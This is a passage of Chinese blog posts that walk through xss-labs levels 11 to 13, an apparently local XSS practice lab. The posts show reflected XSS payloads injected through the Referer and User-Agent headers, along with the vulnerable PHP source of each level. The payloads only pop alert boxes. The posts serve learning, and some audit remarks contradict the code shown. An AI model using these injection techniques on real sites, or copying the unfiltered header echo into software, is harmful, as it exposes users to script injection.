punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level13.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre></li></ol><pre><code>   - 由23、27行代码可知：GET方法得到的参数经过`htmlspecialchars()`函数转义后回显到HTML页面中。   - 由19-21、27行代码可知：程序将通过**GET方法**得到的参数中的尖括号进行过滤后赋值给`name=t_cook`的`input`标签的`value`值。4. 所以含有的尖括号的注入无效，但其他不含尖括号构成的XSS仍可以使用。# 0x05 实验分析- 程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：  ```javascript  user=click me!&quot; type=&quot;button&quot; onclick=&quot;alert(1)  user=&quot; type=&#39;text&#39; onclick=&#39;alert(1)&#39;  ...</code></pre><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level12</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level12/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level12/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level12/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level12<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level12<span class="token punctuation">.</span>php<span class="token operator">?</span>t_sort<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>User Agent<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level12/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>和<code>name=t_sort</code>的<code>input</code>标签中参数的尖括号进行了转义，而对<code>name=t_ua</code>的<code>input</code>标签参数中的尖括号进行过滤，使用不含尖括号的语句可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level12<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span>good<span class="token operator">%</span>20job<span class="token operator">!</span>User Agent<span class="token punctuation">:</span>click me<span class="token operator">!</span><span class="token string">" type="</span>button<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level12/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level13.php?keyword=good job!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level12<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level12<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>search</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.htmlspecialchars($str00).<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_ua<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level12.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由22、26行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由19-21、27行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的尖括号进行过滤后赋值给<code>name=t_ref</code>的<code>a</code>标签的<code>value</code>值。</li></ul></li><li><p>所以含有的尖括号的注入无效，但其他不含尖括号构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript">click me<span class="token operator">!</span><span class="token string">" type="</span>button<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"<span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level11</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level11/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level11/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level11/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level11<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level11<span class="token punctuation">.</span>php<span class="token operator">?</span>t_sort<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>referer<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level11/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>和<code>name=t_sort</code>的<code>input</code>标签中参数的尖括号进行了转义，而对<code>name=t_ref</code>的<code>input</code>标签参数中的尖括号进行过滤，使用不含尖括号的语句可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level11<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span>good<span class="token operator">%</span>20job<span class="token operator">!</span>referer<span class="token punctuation">:</span>click me<span class="token operator">!</span><span class="token string">" type="</span>button<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level11/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level12.php?keyword=good job!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level11<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level11<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>search</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.htmlspecialchars($str00).<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_ref<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level11.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> 